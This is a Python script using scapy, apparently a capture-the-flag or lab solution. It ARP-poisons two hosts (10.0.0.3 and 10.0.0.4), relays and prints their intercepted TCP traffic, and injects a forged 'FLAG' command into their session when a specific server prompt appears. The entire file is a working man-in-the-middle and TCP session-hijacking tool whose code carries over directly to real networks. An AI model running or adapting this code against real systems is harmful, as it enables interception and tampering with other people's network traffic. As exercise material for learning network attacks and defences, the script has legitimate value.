import time
import subprocess
import multiprocessing
import socket
from scapy.all import *


def get_mac_for_IP(ip, src_mac):
	arp_pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=src_mac, pdst=ip)
	res_pkt = srp1(arp_pkt, timeout=3, iface="eth0")
	if res_pkt:
        	return res_pkt.hwsrc
	raise Exception("Failed to get mac!")


def swap_target_mac_my_mac_at_dst(target_ip, dst_ip, dst_mac, src_mac):
	arp_pkt = Ether(src=src_mac, dst=dst_mac)/ARP(hwsrc=src_mac, hwdst=dst_mac, pdst=dst_ip, psrc=target_ip, op="is-at")
	srp1(arp_pkt, timeout=3, iface="eth0", verbose=False)

def child0(src_mac, host3_mac, host4_mac):
	def forward(packet):
		payload = bytes(packet[TCP].payload)
		if(packet[Ether].src == src_mac):
			print(f"\033[1;33m{packet[Ether].src} {packet[IP].src} -> {packet[Ether].dst} {packet[IP].dst} {packet[TCP].seq} {packet[TCP].ack} {packet[TCP].flags} {payload}")
		else:
			print(f"\033[0m{packet[Ether].src} {packet[IP].src} -> {packet[Ether].dst} {packet[IP].dst} {packet[TCP].seq} {packet[TCP].ack} {packet[TCP].flags} {payload}")
		if(packet[Ether].src != src_mac and packet[IP].dst == "10.0.0.3" and packet[IP].src == "10.0.0.4"):
			packet[Ether].dst=host3_mac
			packet[Ether].src=src_mac
			sendp(packet, iface="eth0", verbose=False) # comment if ip forwarding is enabled on our host to not send duplicate packets
		elif(packet[Ether].src != src_mac and packet[IP].dst == "10.0.0.4" and packet[IP].src == "10.0.0.3"):
			if payload == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
				recv_data = packet[Raw].load.decode()
				inj_packet = Ether(src=packet[Ether].dst, dst=packet[Ether].src)/IP(src=packet[IP].dst, dst=packet[IP].src)
				inj_packet = inj_packet/TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, ack=packet[TCP].seq + len(recv_data), flags="PA")/b'FLAG\n'
				sendp(inj_packet, iface="eth0", verbose=False)
			packet[Ether].dst=host4_mac
			packet[Ether].src=src_mac
			sendp(packet, iface="eth0", verbose=False) # comment if ip forwarding is enabled on our host to not send duplicate packets

	sniff(iface="eth0", filter=f"tcp", prn=forward)


src_mac = get_if_hwaddr("eth0")
host3_mac = get_mac_for_IP("10.0.0.3", src_mac)
host4_mac = get_mac_for_IP("10.0.0.4", src_mac)
print(f"MAC of 10.0.0.4 is {host4_mac}")
print(f"MAC of 10.0.0.3 is {host3_mac}")

print("Route 10.0.0.4 to me")
swap_target_mac_my_mac_at_dst("10.0.0.3", "10.0.0.4", host4_mac, src_mac)
print("Route 10.0.0.3 to me")
swap_target_mac_my_mac_at_dst("10.0.0.4", "10.0.0.3", host3_mac, src_mac)

p0 = multiprocessing.Process(target=child0, args=(src_mac, host3_mac, host4_mac))
p0.start()

p0.join()
exit(0)
